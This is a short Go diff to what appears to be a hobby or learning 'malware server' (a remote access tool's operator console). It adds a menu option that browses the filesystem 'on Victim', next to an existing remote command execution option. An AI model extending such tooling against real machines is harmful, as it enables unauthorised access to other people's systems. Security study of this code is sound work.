@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"fmt"
 	"golang-hacking/P3_malwareServer/core/ExecuteCommandWindows"
+	"golang-hacking/P3_malwareServer/core/Move"
 	"golang-hacking/P3_malwareServer/core/handleConnection"
 	"log"
 	"os"
@@ -59,6 +60,10 @@ func main() {
 		case user_input == "1":
 			fmt.Println("[+] Command Execution program")
 			err := ExecuteCommandWindows.ExecuteCommandRemotelyWindows(connection)
+			DisplayError(err)
+		case user_input == "2":
+			fmt.Println("[+] Navigating File system on Victim")
+			err = Move.NavigateFilesystem(connection)
 			DisplayError(err)
 		case user_input == "99":
 			fmt.Println("[+] Exiting the program")
